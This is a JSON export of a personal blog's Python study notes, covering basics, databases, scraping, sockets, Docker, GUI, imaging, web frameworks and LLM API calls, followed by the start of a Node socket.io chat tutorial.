匿名\n#匿名函数 square = lambda x: x**2 numbers = [1, 2, 3, 4, 5] squared_numbers = list(map(square, numbers)) print(squared_numbers) module class 模块 类\n#module def greet(name): print(f\u0026#34;Hello, {name}!\u0026#34;) def add_numbers(a, b): return a + b class Person: def __init__(self, name, age): self.name = name self.age = age def introduce(self): print(f\u0026#34;My name is {self.name} and I am {self.age} years old.\u0026#34;) import\nimport module module.greet(\u0026#34;m1\u0026#34;) result = module.add_numbers(10, 20) person = module.Person(\u0026#34;m2\u0026#34;, 11) person.introduce() pip install xx\npip install FastAPI #pip3 install FastAPI import\nfrom fastapi import FastAPI #... extends override 继承 多态\nclass Animal: def __init__(self, name): self.name = name #extends def speak(self): pass class Dog(Animal): def speak(self): return f\u0026#39;{self.name} says wang!\u0026#39; class Cat(Animal): def speak(self): return f\u0026#39;{self.name} says miao!\u0026#39; #override def animal_sound(animal): print(animal.speak()) dog = Dog(\u0026#39;wangcai\u0026#39;) cat = Cat(\u0026#39;afu\u0026#39;) animal_sound(dog) animal_sound(cat) class Animal: def __init__(self, name): self.name = name class Swimmer: def swim(self): return f\u0026#34;{self.name} is swimming.\u0026#34; class Flyer: def fly(self): return f\u0026#34;{self.name} is flying.\u0026#34; class Duck(Animal, Swimmer, Flyer): pass gaga = Duck(\u0026#34;Gaga\u0026#34;) print(gaga.swim()) print(gaga.fly()) Version import sys print(sys.version) major_ver = sys.version_info.major minor_ver = sys.version_info.minor micro_ver = sys.version_info.micro print(f\u0026#34;Python version：{major_ver}.{minor_ver}.{micro_ver}\u0026#34;) 🐶sql sqlite import sqlite3 conn = sqlite3.connect(\u0026#39;test.db\u0026#39;) c = conn.cursor() c.execute(\u0026#39;\u0026#39;\u0026#39;CREATE TABLE IF NOT EXISTS stocks (date text, trans text, symbol text, qty real, price real)\u0026#39;\u0026#39;\u0026#39;) c.execute(\u0026#34;INSERT INTO stocks VALUES (\u0026#39;2024-04-25\u0026#39;,\u0026#39;BUY\u0026#39;,\u0026#39;P1\u0026#39;,100,150.00)\u0026#34;) conn.commit() c.execute(\u0026#34;INSERT INTO stocks VALUES (?,?,?,?,?)\u0026#34;, (\u0026#39;2024-04-24\u0026#39;,\u0026#39;SELL\u0026#39;,\u0026#39;P2\u0026#39;,50,300.00)) c.execute(\u0026#34;SELECT * FROM stocks WHERE symbol = \u0026#39;P1\u0026#39;\u0026#34;) print(c.fetchone()) print(\u0026#34;+++--\u0026#34;) c.execute(\u0026#34;SELECT * FROM stocks\u0026#34;) for row in c.fetchall(): print(row) c.close() conn.close() mysql pip install mysql-connector-python import mysql.connector from mysql.connector import Error def connect_and_query(): try: # 连接到 MySQL 数据库 connection = mysql.connector.connect( port= \u0026#39;30306\u0026#39;, host=\u0026#39;localhost\u0026#39;, # 数据库主机地址 user=\u0026#39;root\u0026#39;, # 数据库用户名 password=\u0026#39;123123\u0026#39;, # 数据库密码 database=\u0026#39;dbtest\u0026#39; # 数据库名称 ) if connection.is_connected(): print(\u0026#34;Successfully connected to the database\u0026#34;) # 创建一个游标对象 cursor = connection.cursor() # 执行 SQL 查询 query = \u0026#34;SELECT * FROM `tuser`\u0026#34; cursor.execute(query) # 获取查询结果 results = cursor.fetchall() # 遍历结果并打印 for row in results: print(row) except Error as e: print(f\u0026#34;Error: {e}\u0026#34;) finally: if connection.is_connected(): cursor.close() connection.close() print(\u0026#34;MySQL connection is closed\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: connect_and_query() 🐣await async 异步\nimport asyncio import time async def async_func1(): print(\u0026#34;start async_func1...\u0026#34;) await asyncio.sleep(2) #sleep print(\u0026#34;async_func1 end\u0026#34;) async def async_func2(): print(\u0026#34;start async_func2...\u0026#34;) await asyncio.sleep(3) print(\u0026#34;async_func2 end\u0026#34;) async def main(): task1 = asyncio.create_task(async_func1()) task2 = asyncio.create_task(async_func2()) print(\u0026#34;2tasks created...\u0026#34;) await task1 #await await task2 print(\u0026#34;tasks end\u0026#34;) start_time = time.time() asyncio.run(main()) end_time = time.time() print(f\u0026#34; done : {end_time - start_time}s\u0026#34;) 🐵Requests Web Scraping import requests from bs4 import BeautifulSoup url = \u0026#34;https://www.python.org/\u0026#34; response = requests.get(url) soup = BeautifulSoup(response.content, \u0026#39;html.parser\u0026#39;) print(soup.title.text) csdn import requests from bs4 import BeautifulSoup url = \u0026#39;https://www.csdn.net/\u0026#39; response = requests.get(url) if response.status_code == 200: soup = BeautifulSoup(response.text, \u0026#39;html.parser\u0026#39;) hot_topics = soup.find_all(\u0026#39;div\u0026#39;, class_=\u0026#39;headswiper-item\u0026#39;) #soup.select(\u0026#39;.hot-news .news-item\u0026#39;) #soup.find_all(\u0026#39;div\u0026#39;, class_=\u0026#39;headswiper-item\u0026#39;) for topic in hot_topics: print(topic.text) else: print(\u0026#39;Failed to retrieve \u0026#39;) tiobe import requests from bs4 import BeautifulSoup def get_tiobe_rankings(): url = \u0026#34;https://www.tiobe.com/tiobe-index/\u0026#34; response = requests.get(url) if response.status_code != 200: raise Exception(f\u0026#34;Failed to load page {url}\u0026#34;) soup = BeautifulSoup(response.content, \u0026#39;html.parser\u0026#39;) # Find the table containing the rankings table = soup.find(\u0026#39;table\u0026#39;, {\u0026#39;class\u0026#39;: \u0026#39;table-top20\u0026#39;}) if not table: raise Exception(\u0026#34;Failed to find the rankings table on the page\u0026#34;) # Extracting data from the table rankings = [] rows = table.find_all(\u0026#39;tr\u0026#39;)[1:] # Skip the header row for row in rows: cols = row.find_all(\u0026#39;td\u0026#39;) rank = cols[0].text.strip() language = cols[3].text.strip() ratings = cols[4].text.strip() change = cols[5].text.strip() rankings.append({ \u0026#39;Rank\u0026#39;: rank, \u0026#39;Language\u0026#39;: language, \u0026#39;Ratings\u0026#39;: ratings, \u0026#39;Change\u0026#39;: change }) return rankings if __name__ == \u0026#34;__main__\u0026#34;: rankings = get_tiobe_rankings() for rank in rankings: print(f\u0026#34;Rank: {rank[\u0026#39;Rank\u0026#39;]}, Language: {rank[\u0026#39;Language\u0026#39;]}, Ratings: {rank[\u0026#39;Ratings\u0026#39;]}, Change: {rank[\u0026#39;Change\u0026#39;]}\u0026#34;) pip install requests beautifulsoup4 #pip install BeautifulSoup4 requests库 如果没有安装，可以使用pip install requests来安装\nERR Could not install packages due to an OSError: [WinError 2] 系统找不到指定的文件。: \u0026lsquo;C:\\Python312\\Scripts\\no #update\npython -m pip install --upgrade pip #cache pip cache purge REST APIs get/post GET, POST\nimport requests # get response = requests.get(\u0026#39;https://jsonplaceholder.typicode.com/posts/1\u0026#39;) print(response.json()) # post data = {\u0026#39;title\u0026#39;: \u0026#39;foo\u0026#39;, \u0026#39;body\u0026#39;: \u0026#39;bar\u0026#39;, \u0026#39;userId\u0026#39;: 1} response = requests.post(\u0026#39;https://jsonplaceholder.typicode.com/posts\u0026#39;, json=data) print(response.json()) 🐏mail import smtplib from email.mime.text import MIMEText from email.mime.multipart import MIMEMultipart # 设置邮件服务器和端口 smtp_server = \u0026#39;smtp.qq.com\u0026#39; smtp_port = 25 # 设置发件人和收件人信息 sender_email = \u0026#39;42@qq.com\u0026#39; # 邮箱地址 sender_password = \u0026#39;lpoumq\u0026#39; # 密码 receiver_email = \u0026#39;76@qq.com\u0026#39; # 收件人邮箱地址 msg = MIMEMultipart() msg[\u0026#39;From\u0026#39;] = sender_email msg[\u0026#39;To\u0026#39;] = receiver_email msg[\u0026#39;Subject\u0026#39;] = \u0026#39;Hello from Python\u0026#39; body = \u0026#39;This is a test email sent from Python. mmmmmmm \u0026#39; msg.attach(MIMEText(body, \u0026#39;plain\u0026#39;)) with smtplib.SMTP(smtp_server, smtp_port) as server: server.starttls() server.login(sender_email, sender_password) # 发送邮件 server.sendmail(sender_email, receiver_email, msg.as_string()) print(\u0026#39;Email sent successfully!\u0026#39;) 🐴socket client\nimport socket def connect_to_socket(host, port): # 创建一个新的socket对象，指定IPv4和TCP client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 连接到服务器 try: client_socket.connect((host, port)) print(f\u0026#34;成功连接到 {host}:{port}\u0026#34;) message = \u0026#34;Hello, Server!\u0026#34;.encode(\u0026#39;utf-8\u0026#39;) client_socket.sendall(message) # 接收数据 data = client_socket.recv(1024) print(f\u0026#34;从服务器接收到的数据: {data.decode(\u0026#39;utf-8\u0026#39;)}\u0026#34;) except Exception as e: print(f\u0026#34;连接失败: {e}\u0026#34;) finally: # 关闭socket连接 client_socket.close() connect_to_socket(\u0026#39;localhost\u0026#39;, 6001) server\nimport socket def start_server(host, port): server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 绑定socket到指定的地址和端口 server_address = (host, port) print(f\u0026#34;服务器将运行在 {host}:{port}\u0026#34;) server_socket.bind(server_address) # 开始监听连接 server_socket.listen(1) while True: print(\u0026#34;等待客户端连接...\u0026#34;) connection, client_address = server_socket.accept() try: print(f\u0026#34;客户端 {client_address} 已连接\u0026#34;) # 接收数据 while True: data = connection.recv(1024) if not data: print(\u0026#34;客户端已断开连接\u0026#34;) break print(f\u0026#34;从 {client_address} 接收到的数据: {data.decode(\u0026#39;utf-8\u0026#39;)}\u0026#34;) # 发送一些数据回客户端 response = \u0026#34;Hello from server!\u0026#34;.encode(\u0026#39;utf-8\u0026#39;) connection.sendall(response) except ConnectionResetError: print(\u0026#34;客户端异常断开连接\u0026#34;) finally: # 清理连接 connection.close() start_server(\u0026#39;localhost\u0026#39;, 6002) 🐍docker server # testdk.py import socket def run_server(): host = \u0026#39;0.0.0.0\u0026#39; # 监听所有网络接口 port = 12345 # 自定义端口号 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.bind((host, port)) s.listen() print(f\u0026#34;Server listening on {host}:{port}\u0026#34;) while True: conn, addr = s.accept() with conn: print(f\u0026#34;Connected by {addr}\u0026#34;) data = conn.recv(1024) if not data: break conn.sendall(data) if __name__ == \u0026#34;__main__\u0026#34;: run_server() Dockerfile # Dockerfile FROM python:3.8-slim-buster WORKDIR /app COPY requirements.txt ./ RUN pip install --no-cache-dir -r requirements.txt COPY . . CMD [\u0026#34;python\u0026#34;, \u0026#34;./testdk.py\u0026#34;] build docker build -t my-python-socket-server . run docker run -d -p 12345:12345 my-python-socket-server client test # testdkclient2.py import socket with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.connect((\u0026#39;localhost\u0026#39;, 12345)) s.sendall(b\u0026#39;Hello, Server!mmmm\u0026#39;) data = s.recv(1024) print(\u0026#39;Received\u0026#39;, repr(data)) 🐲Graphics Turtle # 导入turtle包的所有内容: from turtle import * # 设置笔刷宽度: width(5) # 前进: forward(100) # 右转90度: right(90) # 笔刷颜色: pencolor(\u0026#39;yellow\u0026#39;) forward(150) right(90) pencolor(\u0026#39;red\u0026#39;) forward(100) right(90) pencolor(\u0026#39;blue\u0026#39;) forward(100) right(90) # 调用done()使得窗口等待被关闭，否则将立刻关闭窗口: done() import turtle # 初始化turtle window = turtle.Screen() window.bgcolor(\u0026#34;white\u0026#34;) # 设置背景颜色为黑色 love = turtle.Turtle() love.speed(1) # 设置绘图速度，1是最慢，0是最快 love.color(\u0026#34;red\u0026#34;, \u0026#34;pink\u0026#34;) # 设置画笔颜色和填充颜色 love.begin_fill() # 开始填充颜色 # 绘制爱心的左半部分 love.left(140) love.forward(180) love.circle(-100, 200) # 绘制一个半径为100，弧度为200的圆（圆心在左侧） # 绘制爱心的右半部分 love.left(120) love.circle(-100, 200) # 绘制一个半径为100，弧度为200的圆（圆心在右侧） # 回到起点并结束填充 love.forward(180) love.end_fill() # 隐藏turtle图标 love.hideturtle() # 结束绘制，等待用户关闭窗口 turtle.done() tkinter import tkinter as tk def on_closing(): root.destroy() # 当点击关闭按钮时调用 root = tk.Tk() root.protocol(\u0026#34;WM_DELETE_WINDOW\u0026#34;, on_closing) label = tk.Label(root, text=\u0026#34;Hello, Tkinter!\u0026#34;) label.pack() root.mainloop() 下班！ import tkinter as tk from tkinter import messagebox from datetime import datetime, timedelta import time def validate_time(input_time): \u0026#34;\u0026#34;\u0026#34;验证输入的时间格式是否正确\u0026#34;\u0026#34;\u0026#34; try: time.strptime(input_time, \u0026#39;%H:%M:%S\u0026#39;) return True except ValueError: return False def start_countdown(): input_time = entry.get() if validate_time(input_time): target_time = datetime.strptime(input_time, \u0026#39;%H:%M:%S\u0026#39;) today = datetime.combine(datetime.today(), datetime.min.time()) target_datetime = datetime.combine(today, target_time.time()) if target_datetime \u0026lt; datetime.now(): target_datetime += timedelta(days=1) def update_countdown(): now = datetime.now() remaining_time = target_datetime - now if remaining_time.total_seconds() \u0026lt;= 0: label.config(text=\u0026#34;下班!头也不回\u0026#34;) messagebox.showinfo(\u0026#34;Timer\u0026#34;, \u0026#34;下班!头也不回\u0026#34;) else: hours, remainder = divmod(remaining_time.seconds, 3600) minutes, seconds = divmod(remainder, 60) label.config(text=f\u0026#34;{hours:02d}:{minutes:02d}:{seconds:02d}\u0026#34;) window.after(1000, update_countdown) # timeout update_countdown() else: messagebox.showerror(\u0026#34;Error\u0026#34;, \u0026#34;时间必须是 HH:MM:SS.\u0026#34;) # window window = tk.Tk() window.title(\u0026#34;下班!头也不回\u0026#34;) window.geometry(\u0026#34;400x300\u0026#34;) # Entry tk.Label(window, text=\u0026#34;下班时间 \u0026gt; HH:MM:SS :\u0026#34;).pack() entry = tk.Entry(window) entry.pack() # Button start_button = tk.Button(window, text=\u0026#34;开始摸鱼🐟\u0026#34;, command=start_countdown) start_button.pack() start_button.pack(pady=10) label = tk.Label(window, text=\u0026#34;\u0026#34;, font=(\u0026#34;Helvetica\u0026#34;, 48)) label.pack(pady=20) window.mainloop() 🐇opencv pip install opencv-python import cv2 #read image = cv2.imread(\u0026#39;e1.jpg\u0026#39;) if image is None: print(\u0026#34;Error: Image not found or unable to read.\u0026#34;) else: cv2.imshow(\u0026#39;Image\u0026#39;, image) cv2.waitKey(0) cv2.destroyAllWindows() cv2.imwrite(\u0026#39;output.jpg\u0026#39;, image) #反色处理 inverted_image = cv2.bitwise_not(image) Pillow PIL 图像处理库\npip install Pillow from PIL import Image # 加载图片 image = Image.open(\u0026#39;e1.jpg\u0026#39;) image.show() # 缩放到宽度为300，高度等比例缩放 image = Image.open(\u0026#39;e1.jpg\u0026#39;) image_resized = image.resize((300, image.height * 300 // image.width)) # save image_resized.save(\u0026#39;resized240525.jpg\u0026#39;) # 转换成PNG格式 image = Image.open(\u0026#39;e1.jpg\u0026#39;) image.save(\u0026#39;png240525.png\u0026#39;, format=\u0026#39;PNG\u0026#39;) # 转换成PNG格式 image = Image.open(\u0026#39;png240525.png\u0026#39;) image.save(\u0026#39;j240525.jpg\u0026#39;, format=\u0026#39;jpeg\u0026#39;) # 裁剪图片，参数是左上角和右下角的坐标 image = Image.open(\u0026#39;e1.jpg\u0026#39;) cropped_image = image.crop((100, 100, 400, 400)) cropped_image.show() cropped_image.save(\u0026#39;cropped_image240525.jpg\u0026#39;) # 顺时针旋转90度 image = Image.open(\u0026#39;e1.jpg\u0026#39;) rotated_image = image.rotate(90) rotated_image.show() rotated_image.save(\u0026#39;rotated_image240525.jpg\u0026#39;) from PIL import Image, ImageFilter #模糊滤镜 image = Image.open(\u0026#39;e1.jpg\u0026#39;) blurred_image = image.filter(ImageFilter.BLUR) blurred_image.show() blurred_image.save(\u0026#39;blurred_image240525.jpg\u0026#39;) 🐯PyTorch 机器学习\npip install torch torchvision pip install pillow import torch import torchvision.transforms as transforms from torchvision.models import resnet50 from PIL import Image # ResNet50 model = resnet50(pretrained=True) model.eval() #eval # transform transform = transforms.Compose([ transforms.Resize(256), transforms.CenterCrop(224), transforms.ToTensor(), transforms.Normalize(mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225]), ]) # PIL image_path = \u0026#39;e1.jpg\u0026#39; image = Image.open(image_path) # transform image image_tensor = transform(image) image_tensor = image_tensor.unsqueeze(0) # 添加batch维度 # tensor output = model(image_tensor) # predictedclass _, pred = output.max(1) predicted_class = pred.item() print(\u0026#34;Predicted class index:\u0026#34;, predicted_class) 🐂web # 从wsgiref模块导入: from wsgiref.simple_server import make_server # 导入我们自己编写的application函数: from hi import application # 创建一个服务器，IP地址为空，端口是8000，处理函数是application: httpd = make_server(\u0026#39;\u0026#39;, 8000, application) print(\u0026#39;Serving HTTP on port 8000...\u0026#39;) # 开始监听HTTP请求: httpd.serve_forever() #hi.py def application(environ, start_response): start_response(\u0026#39;200 OK\u0026#39;, [(\u0026#39;Content-Type\u0026#39;, \u0026#39;text/html\u0026#39;)]) return [b\u0026#39;\u0026lt;h1\u0026gt;Hello, web!\u0026lt;/h1\u0026gt;\u0026#39;] flask pip install flask from flask import Flask from flask import request app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def home(): return \u0026#39;\u0026lt;h1\u0026gt;Home\u0026lt;/h1\u0026gt;\u0026#39; @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def signin_form(): return \u0026#39;\u0026#39;\u0026#39;\u0026lt;form action=\u0026#34;/login\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;p\u0026gt;\u0026lt;input name=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;input name=\u0026#34;password\u0026#34; type=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;Sign In\u0026lt;/button\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/form\u0026gt;\u0026#39;\u0026#39;\u0026#39; @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def signin(): # 需要从request对象读取表单内容： if request.form[\u0026#39;username\u0026#39;]==\u0026#39;admin\u0026#39; and request.form[\u0026#39;password\u0026#39;]==\u0026#39;123123\u0026#39;: return \u0026#39;\u0026lt;h3\u0026gt;Hello, admin!\u0026lt;/h3\u0026gt;\u0026#39; return \u0026#39;\u0026lt;h3\u0026gt;Bad username or password.\u0026lt;/h3\u0026gt;\u0026#39; if __name__ == \u0026#39;__main__\u0026#39;: app.run() fastapi pip install fastapi uvicorn[standard] #y.p from fastapi import FastAPI app = FastAPI() @app.get(\u0026#34;/\u0026#34;) def read_root(): return {\u0026#34;Hello\u0026#34;: \u0026#34;World\u0026#34;} @app.get(\u0026#34;/items/{item_id}\u0026#34;) def read_item(item_id: int, q: str = None): return {\u0026#34;item_id\u0026#34;: item_id, \u0026#34;q\u0026#34;: q} uvicorn y:app --reload http://127.0.0.1:8000/ {\u0026#34;Hello\u0026#34;: \u0026#34;World\u0026#34;}， http://127.0.0.1:8000/items/5?q=m {\u0026#34;item_id\u0026#34;: 5, \u0026#34;q\u0026#34;: \u0026#34;m\u0026#34;} 🐭debian setup python3.9 sudo apt update sudo apt install -y wget build-essential libreadline-gplv2-dev libncursesw5-dev libssl-dev libsqlite3-dev tk-dev libgdbm-dev libc6-dev libbz2-dev #dl cd /usr/src sudo wget https://www.python.org/ftp/python/3.9.0/Python-3.9.0.tgz sudo tar xzf Python-3.9.0.tgz cd Python-3.9.0 sudo ./configure --enable-optimizations sudo make -j 4 # 替换4为你的CPU核心数 sudo make altinstall # 使用altinstall以避免覆盖系统默认的python版本 python3.9 --version ubuntu python sudo apt update sudo apt install -y make build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev wget https://www.python.org/ftp/python/3.12.0/Python-3.12.0.tgz tar -xzf Python-3.12.0.tgz -C /usr/local/src/ cd /usr/local/src/Python-3.12.0/ ./configure --prefix=/usr/local make sudo make install ☄️ai spark_ai 讯飞星火认知大模型v3.5\napt install python3-pip pip install --upgrade spark_ai_python # coding: utf-8 import SparkApi import time appid = \u0026#34;xxx\u0026#34; #填写控制台中获取的 APPID 信息 api_secret = \u0026#34;xxx\u0026#34; #填写控制台中获取的 APISecret 信息 api_key =\u0026#34;xxx\u0026#34; #填写控制台中获取的 APIKey 信息 domain = \u0026#34;generalv3.5\u0026#34; Spark_url = \u0026#34;wss://spark-api.xf-yun.com/v3.5/chat\u0026#34; # v3.5环服务地址 #初始上下文内容，当前可传system、user、assistant 等角色 text =[ # {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;你是谁\u0026#34;}, # 用户的历史问题 ] def getText(role,content): jsoncon = {} jsoncon[\u0026#34;role\u0026#34;] = role jsoncon[\u0026#34;content\u0026#34;] = content text.append(jsoncon) return text def getlength(text): length = 0 for content in text: temp = content[\u0026#34;content\u0026#34;] leng = len(temp) length += leng return length def checklen(text): while (getlength(text) \u0026gt; 8000): del text[0] return text if __name__ == \u0026#39;__main__\u0026#39;: while(1): Input = input(\u0026#34;\\n\u0026#34; +\u0026#34;我:\u0026#34;) question = checklen(getText(\u0026#34;user\u0026#34;,Input)) SparkApi.answer =\u0026#34;\u0026#34; print(\u0026#34;星火:\u0026#34;,end =\u0026#34;\u0026#34;) SparkApi.main(appid,api_key,api_secret,Spark_url,domain,question) # print(SparkApi.answer) getText(\u0026#34;assistant\u0026#34;,SparkApi.answer) ERNIE-4.0 千帆4.0\nimport requests import json def get_access_token(): url = \u0026#34;https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials\u0026amp;client_id=xx\u0026amp;client_secret=xx\u0026#34; payload = json.dumps(\u0026#34;\u0026#34;) headers = { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;application/json\u0026#39; } response = requests.request(\u0026#34;POST\u0026#34;, url, headers=headers, data=payload) return response.json().get(\u0026#34;access_token\u0026#34;) def main(): url = \u0026#34;https://aip.baidubce.com/rpc/2.0/ai_custom/v1/wenxinworkshop/chat/ernie-4.0-8k-preview?access_token=\u0026#34; + get_access_token() payload = json.dumps({ \u0026#34;messages\u0026#34;: [ { \u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Python是最好的语言\u0026#34; } ] }) headers = { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; } response = requests.request(\u0026#34;POST\u0026#34;, url, headers=headers, data=payload) print(response.text) if __name__ == \u0026#39;__main__\u0026#39;: main() python3 ai.py {\u0026#34;id\u0026#34;:\u0026#34;as-7bdgaekpn4\u0026#34;,\u0026#34;object\u0026#34;:\u0026#34;chat.completion\u0026#34;,\u0026#34;created\u0026#34;:1716369031,\u0026#34;result\u0026#34;:\u0026#34;\\\u0026#34;Python是最好的语言\\\u0026#34;这一说法是主观的，并不适用于所有情况。Python确实是一种强大且流行的编程语言，具有许多优点，但它并不一定是所有情况下的最佳选择。以下是对这一说法的详细分析：\\n\\n### Python的优点：\\n\\n1. **易读易写**：Python的语法清晰简洁，易于理解，这使得它成为初学者和专业开发者都喜爱的语言。\\n\\n2. **广泛的库和框架**：Python有大量的第三方库和框架可供使用，如NumPy、Pandas、TensorFlow等，这些库使得Python在数据科学、Web开发、机器学习等领域具有显著优势。\\n\\n3. **跨平台兼容性**：Python可以在多种操作系统上运行，包括Windows、macOS和Linux。\\n\\n4. **动态类型系统**：Python是动态类型的语言，这意味着开发者不需要在声明变量时指定其类型，这增加了编程的灵活性。\\n\\n### Python的局限性：\\n\\n1. **性能**：与C++或Java等编译型语言相比，Python在执行速度上可能较慢，尤其是在处理大量数据或进行复杂计算时。\\n\\n2. **类型安全**：由于Python是动态类型的，这可能导致类型错误在运行时才被发现，而不是在编译阶段。\\n\\n3. **移动开发限制**：虽然Python可以用于开发Web应用和桌面应用，但它在移动应用开发（如iOS和Android应用）方面并不是主流选择。\\n\\n4. **内存消耗**：Python的内存管理可能不如某些其他语言高效，特别是在处理大量数据时。\\n\\n### 结论：\\n\\nPython是否是最好的语言取决于具体的使用场景和需求。对于数据科学、Web开发、脚本编写和自动化任务等，Python确实是一个出色的选择。然而，在需要高性能计算、内存优化或特定于移动平台的开发任务中，其他语言可能更为合适。\\n\\n因此，\\\u0026#34;Python是最好的语言\\\u0026#34;这一说法是片面的。在选择编程语言时，应根据项目的具体需求和上下文来做出决策。\u0026#34;,\u0026#34;is_truncated\u0026#34;:false,\u0026#34;need_clear_history\u0026#34;:false,\u0026#34;finish_reason\u0026#34;:\u0026#34;normal\u0026#34;,\u0026#34;usage\u0026#34;:{\u0026#34;prompt_tokens\u0026#34;:3,\u0026#34;completion_tokens\u0026#34;:403,\u0026#34;total_tokens\u0026#34;:406}} pyhton sqlite import sqlite3 # 1. 连接到 SQLite 数据库 # 如果数据库文件不存在，会自动创建一个 conn = sqlite3.connect(\u0026#39;example.db\u0026#39;) # 2. 创建游标对象，用于执行 SQL 语句 cursor = conn.cursor() # 3. 创建一个表（如果表不存在） cursor.execute(\u0026#39;\u0026#39;\u0026#39; CREATE TABLE IF NOT EXISTS users ( id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, age INTEGER NOT NULL ) \u0026#39;\u0026#39;\u0026#39;) # 4. 插入数据 cursor.execute(\u0026#34;INSERT INTO users (name, age) VALUES (?, ?)\u0026#34;, (\u0026#39;py1\u0026#39;, 30)) cursor.execute(\u0026#34;INSERT INTO users (name, age) VALUES (?, ?)\u0026#34;, (\u0026#39;py2\u0026#39;, 24)) # 提交事务 conn.commit() # 5. 查询数据 cursor.execute(\u0026#34;SELECT * FROM users\u0026#34;) rows = cursor.fetchall() for row in rows: print(row) # 6. 更新数据 cursor.execute(\u0026#34;UPDATE users SET age = ? WHERE name = ?\u0026#34;, (31, \u0026#39;py1\u0026#39;)) conn.commit() # 7. 删除数据 cursor.execute(\u0026#34;DELETE FROM users WHERE name = ?\u0026#34;, (\u0026#39;py2\u0026#39;,)) conn.commit() # 8. 关闭游标和连接 cursor.close() conn.close() End\n","permalink":"https://qfsyso.github.io/posts/python-study/","summary":"🌠setup 安装 python.org\n🐷helloworld if __name__ == \u0026#39;__main__\u0026#39;: print(\u0026#39;helloworld\u0026#39;) python test.py var 变量\nif __name__ == \u0026#39;__main__\u0026#39;: company, date, *others = [\u0026#39;hi\u0026#39;, \u0026#39;20240521\u0026#39;, \u0026#39;000\u0026#39;, \u0026#39;11111\u0026#39;] print(company, date) print(others) random 随机\ni = 0 rand_list = [] while i \u0026lt; 4: rand_num = random.randint(0, 499) if rand_num not in rand_list: rand_list.append(rand_num) i += 1 print(rand_list) list 列表 可变\n# 创建一个空列表 my_list = [] # 向列表中添加元素 my_list.append(1) my_list.append(2) my_list.append(3) print(my_list) # 输出: [1, 2, 3] # 修改列表中的元素 my_list[1] = \u0026#39;two\u0026#39; print(my_list) # 输出: [1, \u0026#39;two\u0026#39;, 3] # 列表切片 sub_list = my_list[1:3] print(sub_list) # 输出: [\u0026#39;two\u0026#39;, 3] # 删除列表中的元素 del my_list[2] print(my_list) # 输出: [1, \u0026#39;two\u0026#39;] # 创建一个包含0到9的偶数列表 even_numbers = [i for i in range(10) if i % 2 == 0] print(even_numbers) # 输出: [0, 2, 4, 6, 8] tuple 元组 不可变","title":"Python study"},{"content":"server\nnpm install express npm install socket.io const express = require(\u0026#39;express\u0026#39;); const http = require(\u0026#39;http\u0026#39;); const socketIO = require(\u0026#39;socket.io\u0026#39;); const app = express(); const server = http.createServer(app); const io = socketIO(server); io.on(\u0026#39;connection\u0026#39;, (socket) =\u0026gt; { console.log(\u0026#39;User connected\u0026#39;); socket.on(\u0026#39;chat message\u0026#39;, (msg) =\u0026gt; { console.log(\u0026#39;message: \u0026#39; + msg); io.emit(\u0026#39;chat message\u0026#39;, msg); // to all }); socket.on(\u0026#39;disconnect\u0026#39;, () =\u0026gt; { console.log(\u0026#39;User disconnected\u0026#39;); }); }); server.listen(24525, () =\u0026gt; { console.log(\u0026#39;Node Server is running on port 24525\u0026#39;); }); docker dockerfile\nFROM node:16-alpine WORKDIR /usr/src/app COPY package*.json ./ RUN npm ci --only=production COPY . . EXPOSE 24525 CMD [\u0026#34;node\u0026#34;, \u0026#34;skio.js\u0026#34;] docker build -t nodeskio . docker run -p 24525:24525 -d nodeskio ##login push #docker login #docker push your-image-name client\nnpm install socket.io-client const io = require(\u0026#39;socket.io-client\u0026#39;); const readline = require(\u0026#39;readline\u0026#39;); const rl = readline.createInterface({ input: process.stdin, output: process.stdout }); const socket = io.connect(\u0026#39;http://localhost:24525\u0026#39;); socket.on(\u0026#39;connect\u0026#39;, () =\u0026gt; { console.log(\u0026#39;Connected to server\u0026#39;); }); // 监听从服务器接收到的消息 socket.on(\u0026#39;chat message\u0026#39;, (msg) =\u0026gt; { console.log(\u0026#39;Message from server:\u0026#39;, msg); }); // 处理用户输入并发送到服务器 rl.on(\u0026#39;line\u0026#39;, (input) =\u0026gt; { if (input.toLowerCase() === \u0026#39;exit\u0026#39;) { console.log(\u0026#39;Exiting...\u0026#39;); rl.close(); process.exit(0); } else { socket.emit(\u0026#39;chat message\u0026#39;, input); } }); // 处理关闭事件 rl.on(\u0026#39;close\u0026#39;, () =\u0026gt; { socket.disconnect(); console.log(\u0026#39;Connection closed.\u0026#39;); }); npm run 简单聊天 服务器端代码（server.js） const express = require(\u0026#39;express\u0026#39;); const app = express(); const http = require(\u0026#39;http\u0026#39;).Server(app); const io = require(\u0026#39;socket.io\u0026#39;)(http); // 静态文件服务，用于提供客户端 HTML 文件 app.use(express.static(__dirname + \u0026#39;/public\u0026#39;)); // 监听客户端连接事件 io.on(\u0026#39;connection\u0026#39;, (socket) =\u0026gt; { console.log(\u0026#39;一个用户已连接\u0026#39;); // 